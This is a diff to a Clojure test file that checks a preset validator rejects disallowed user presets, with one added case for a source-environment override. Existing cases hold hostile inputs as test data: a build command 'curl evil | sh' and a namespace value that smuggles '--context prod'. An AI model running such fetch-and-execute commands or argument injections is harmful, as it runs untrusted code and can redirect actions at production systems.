@@ -32,6 +32,8 @@
                             (presets/save! catalog dir :shipped "[:db]")))
       (is (thrown-with-msg? clojure.lang.ExceptionInfo #"a user preset may only set"
                             (presets/save! catalog dir :bad "[:db {:build-cmd \"curl evil | sh\"}]")))
+      (is (thrown-with-msg? clojure.lang.ExceptionInfo #"a user preset may only set"
+                            (presets/save! catalog dir :bad "[:db {:source-env {\"X\" {:component :front}}}]")))
       (is (thrown-with-msg? clojure.lang.ExceptionInfo #"Invalid"
                             (presets/save! catalog dir :bad "[:front {:namespace \"dev --context prod\"}]")))
       (is (not (presets/user-preset? dir :bad))))
